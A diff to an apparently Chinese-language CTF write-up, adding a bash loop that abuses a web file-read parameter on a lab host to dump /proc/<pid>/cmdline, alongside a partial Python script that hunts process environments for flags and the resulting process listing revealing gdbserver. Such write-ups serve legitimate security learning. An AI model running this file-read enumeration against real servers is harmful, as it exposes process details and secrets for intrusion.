@@ -137,7 +137,7 @@ server {
 ```
 
 回顾：
-借助scdyh的wp获取env和cmdline
+借助scdyh的wp获取env和cmdline,以及nop的脚本，好好学习脚本了😋
 ```python
 import requests
 url = "http://192.168.32.230/index.php"
@@ -155,3 +155,32 @@ for pid_path in pids_raw:
        if "514" in env or "FLAG" in env or "hint" in env:
            print(f"ENV: {env}")
 ```
+```bash
+#!/bin/bash
+URL="http://172.18.105.157"
+
+for pid in $(curl -s "$URL/?action=list" | sed 's|/proc/||'); do
+    CMD=$(curl -s "$URL/?file=/proc/$pid/cmdline" | tr '\0' ' ')
+    if [[ -n "$CMD" ]]; then
+        echo "PID $pid: $CMD"
+    fi
+done
+```
+发现存在gdbserver用户
+```bash
+PID 1: /sbin/init 
+PID 3202: /sbin/udhcpc -b -R -p /var/run/udhcpc.eth0.pid -i eth0 -x hostname:Koishi 
+PID 3302: /sbin/syslogd -t -n 
+PID 3329: /sbin/acpid -f 
+PID 3355: /usr/sbin/crond -c /etc/crontabs -f 
+PID 3382: /usr/bin/gdbserver --multi :0 
+PID 3413: nginx: master process /usr/sbin/nginx -c /etc/nginx/nginx.conf 
+PID 3414: nginx: worker process                    
+PID 3415: nginx: worker process                    
+PID 3441: /usr/sbin/ntpd -N -p pool.ntp.org -n 
+PID 3474: php-fpm: master process (/etc/php83/php-fpm.conf)                 
+PID 3503: php-fpm: pool www                                                  
+PID 3504: php-fpm: pool www                                                  
+PID 3506: sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups 
+PID 3840: Error: Access Denied or File Unreadable
+``` 
